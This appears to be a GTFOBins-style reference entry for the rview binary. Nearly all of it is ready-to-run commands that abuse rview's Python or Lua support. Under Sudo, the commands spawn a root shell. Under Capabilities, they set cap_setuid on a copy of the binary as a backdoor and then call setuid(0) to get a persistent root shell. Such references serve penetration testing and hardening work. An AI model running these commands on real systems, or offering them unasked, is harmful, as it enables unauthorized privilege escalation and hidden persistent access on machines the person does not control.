***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * This requires that rview is compiled with Python support. Prepend :py3
      for Python 3.
      sudo rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset;
      exec sh")'
    * This requires that rview is compiled with Lua support.
      sudo rview -c ':lua os.execute("reset; exec sh")'
***** Capabilities *****
If the binary has the Linux CAP_SETUID capability set or it is executed by
another binary with the capability set, it can be used as a backdoor to
maintain privileged access by manipulating its own process UID.
    * This requires that rview is compiled with Python support. Prepend :py3
      for Python 3.
      cp $(which rview) .
      sudo setcap cap_setuid+ep rview

      ./rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c",
      "reset; exec sh")'
